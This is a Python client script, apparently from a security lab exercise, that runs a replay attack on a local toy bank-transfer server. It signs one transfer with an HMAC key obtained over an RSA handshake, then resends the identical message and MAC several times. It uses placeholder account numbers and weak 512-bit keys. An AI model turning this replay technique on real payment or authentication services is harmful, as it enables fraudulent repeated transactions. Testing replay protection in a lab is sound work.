# clientsocket.py

import socket
import secrets, hmac, hashlib, rsa, time

HOST = "127.0.0.1"  # The server's hostname or IP address
PORT = 3030  # The port used by the server


def attack_replay(origen, destino, cantidad, numero_ataques):
    # Generamos clave privada y publica para pedir con ella la key
    publicKey, privateKey = rsa.newkeys(512)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        cantidad = cantidad.zfill(10)
        
        s.connect((HOST, PORT))
        publicKey_n = publicKey.n
        publicKey_e = publicKey.e
        s.sendall(bytes(str(publicKey_n), 'utf-8'))
        #print("Enviada primera parte de la clave pública")
        time.sleep(1)
        s.sendall(bytes(str(publicKey_e), 'utf-8'))
        #print("Enviada segunda parte de la clave pública")
        data1 = s.recv(1024)
        #print("Recibida la informacion de la clave MAC")

        
        key_mac = rsa.decrypt(data1, privateKey).decode()
        #print(f"Key MAC recibida: " + key_mac)

        # Desde Python3.6 existe el módulo secrets
        # Con él podemos generar numeros aleatorios criptograficamente fuertes aptos para gestionar autenticación, contraseñas o tokens de seguridad.
        nonce = secrets.token_urlsafe()

        mensaje = nonce + origen + destino + cantidad
        #print("mensaje:"+ str(len(mensaje)) +"\n" +
        #      "nonce:" + str(len(nonce)) + "\n" +
        #      "mensaje:"+ str(len(origen)) +"\n" +
        #      "mensaje:"+ str(len(destino)) +"\n" +
        #      "cantidad:"+ str(len(cantidad)) +"\n" )
        #print("EL MENSAJE ES: " + mensaje)

        mac = hmac.new(bytes(key_mac, 'utf-8'), bytes(mensaje, 'utf-8'), hashlib.sha256).digest()

    #with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    #    s.connect((HOST, PORT))
        print("Primera petición (legítima)")
        s.sendall(bytes(mensaje + str(mac), 'utf-8'))
        data2 = s.recv(1024)
        print(f"Received:\n"+ data2.decode('utf-8'))
        time.sleep(3)

    print("¡ Ataque REPLAY iniciado !")
        
    # Los ataques no solo reenvían la info
    # sino que también emulan el handshake de claves inicial
    for n in range(numero_ataques):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            
            print("¡ Ataque " + str(n+1) + " !")
            s.sendall(bytes(str(publicKey_n), 'utf-8'))
            time.sleep(1)
            s.sendall(bytes(str(publicKey_e), 'utf-8'))
            time.sleep(1)
            s.recv(1024)
            s.sendall(bytes(mensaje + str(mac), 'utf-8'))
            data2 = s.recv(1024)
            print(f"Received:\n"+ data2.decode('utf-8'))
            time.sleep(3)



cliente_atacado = ("ES00000000000000000000", "ES11111111111111111111", "200")
cliente_atacado2 = ("ES00000000000000000111", "ES11111111111111111222", "1220000")


attack_replay(cliente_atacado[0], cliente_atacado[1], cliente_atacado[2], 5)
attack_replay(cliente_atacado[0], cliente_atacado[1], cliente_atacado[2], 4)
attack_replay(cliente_atacado[0], cliente_atacado[1], cliente_atacado[2], 2)
attack_replay(cliente_atacado2[0], cliente_atacado2[1], cliente_atacado2[2], 1)
attack_replay(cliente_atacado2[0], cliente_atacado2[1], cliente_atacado2[2], 2)